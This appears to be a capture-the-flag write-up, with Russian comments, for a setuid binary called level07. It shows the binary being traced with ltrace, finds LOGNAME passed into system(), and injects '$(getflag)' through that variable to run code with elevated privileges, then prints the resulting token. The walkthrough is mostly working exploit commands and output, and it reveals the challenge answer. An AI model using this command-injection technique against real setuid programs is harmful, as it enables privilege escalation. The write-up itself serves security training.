```
ls -l
```
> total 12\
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

```
ltrace ./level07
```
> \_\_libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>\
getegid()                                                                                                     = 2007\
geteuid()                                                                                                     = 2007\
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0\
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0\
getenv("LOGNAME")                                                                                             = "level07" <------ `Видно что тут берется переменная из LOGNAME`\
asprintf(0xbffff704, 0x8048688, 0xbfffff33, 0xb7e5ee55, 0xb7fed280)                                           = 18\
system("/bin/echo level07 "level07\
 <unfinished ...>\
--- SIGCHLD (Child exited) ---\
<... system resumed> )                                                                                        = \
+++ exited (status 0) +++

Пробуем ее подменить
```
export LOGNAME=ls;
./level07
```
> ls

Пробуем подменить ее на код, который выполнится

```
export LOGNAME=$(ls -l);
./level07
```
> total 12\
sh: 2: -rwsr-sr-x: not found

Код выполняется, а значит даем ему getflag

```
export LOGNAME=$(getflag)
./level07
```
> Check flag.Here is your token :\
sh: 2: Syntax error: ")" unexpected

```
export LOGNAME='$(getflag)'
./level07
```
> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
